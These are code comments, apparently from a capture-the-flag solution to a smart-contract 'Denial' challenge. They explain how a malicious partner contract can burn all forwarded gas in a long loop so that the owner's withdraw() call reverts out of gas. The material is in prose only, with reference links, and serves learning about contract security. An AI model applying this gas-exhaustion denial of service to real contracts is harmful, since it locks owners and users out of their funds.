        // This challenge is all about Denial of Service

        // or gain ownership of it but to just make impossible for the owner
        // or other user in general to interact with it

        // Every time the `withdraw()` function is called
        // the partner and the owner will get 1% of the balance
        // The contract is using the lowlevel `call` method to send money to the `partner`
        // In this way, even if we reverted internally or we deployed a contract unable to receive ether
        // the `Denial` contract would not revert, the only conseguence is that us (as partner) we wouldn't receive
        // any ether.

        // How can we deny the service?
        // The only option to do so is to run the transaction (block) out of gas!
        // Each block on ethereum has a max gas that can be spent for it
        // if your transaction consume all the block's gas or it consume all the gas that have been payed
        // by the caller to execute the transaction, the transaction will revert with a Out Of Gas error
        // More info ->
        // - https://consensys.github.io/smart-contract-best-practices/attacks/denial-of-service/
        // - https://swcregistry.io/docs/SWC-128
        //
        // In our case we took the easier solution possible: A very, very, very long loop that just do an operation
        // this is just enough to make the transaction revert. If this was not the case, you just need to add
        // more operations to the loop to consume even more gas!
